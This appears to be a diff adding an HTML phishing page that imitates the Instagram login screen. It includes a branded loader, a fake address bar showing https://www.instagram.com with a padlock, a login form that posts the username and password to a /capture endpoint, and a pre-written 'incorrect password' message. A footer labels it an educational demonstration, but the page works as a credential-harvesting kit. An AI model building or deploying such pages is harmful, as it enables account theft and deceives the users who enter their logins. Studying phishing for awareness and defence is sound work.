@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+        <!-- 1. PRO LOADER (Asli Instagram Jaisa) -->
+    <div id="loader" style="position: fixed; top: 0; left: 0; width: 100%; height: 100vh; background: #fafafa; display: flex; justify-content: center; align-items: center; z-index: 9999; flex-direction: column;">
+        <!-- Asli Instagram text style font -->
+        <h1 style="font-family: 'Billabong', 'Segoe UI', cursive; font-size: 50px; color: #262626; margin-bottom: 20px; font-weight: 500; letter-spacing: 1px;">
+            Instagram
+        </h1>
+        <!-- Ek chota sa clean ghoomta hua circle -->
+        <div style="border: 3px solid #dbdbdb; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 0.8s linear infinite;"></div>
+    </div>
+    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+    
+    <!-- 2. FAKE URL BAR -->
+    <div style="background: #fff; border-bottom: 1px solid #dbdbdb; padding: 10px 15px; display: flex; align-items: center; justify-content: center; font-family: sans-serif; font-size: 14px; color: #262626; position: relative; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.05);">
+        <span style="margin-right: 8px; color: #333;">🔒</span>
+        <span style="font-weight: 500; color: #262626;">https://www.instagram.com</span>
+    </div>
+
+    <div class="container">
+        <div class="login-box">
+            <h1 class="logo">Instagram</h1>
+            
+            <div id="errorMessage" style="display: none; color: #ed4956; text-align: center; font-size: 14px; margin-bottom: 15px; font-weight: 500; line-height: 1.2;">
+                Sorry, your password was incorrect. Please double-check your password.
+            </div>
+
+            <form action="/capture" method="POST" id="loginForm">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                
+                <div class="password-container">
+                    <input type="password" name="password" id="passwordField" placeholder="Password" required>
+                    <span id="togglePassword" class="eye-icon">👁️</span>
+                </div>
+                
+                <button type="submit" id="loginBtn">Log In</button>
+            </form>
+
+            <div class="divider"><div class="line"></div><span>OR</span><div class="line"></div></div>
+            <div class="fb-login"><span class="fb-icon">f</span> Log in with Facebook</div>
+            <a href="#" class="forgot">Forgot password?</a>
+        </div>
+
+        <div class="signup-box">Don't have an account? <span>Sign up</span></div>
+    </div>
+    
+    <footer style="text-align: center; font-size: 11px; color: #888; margin-top: 30px; margin-bottom: 20px;">
+        Educational cybersecurity demonstration. Do not enter real credentials.
+    </footer>
+
+    <!-- 3. EXTERNAL JAVASCRIPT -->
+    <script src="js/script.js"></script>
+</body>
+</html>
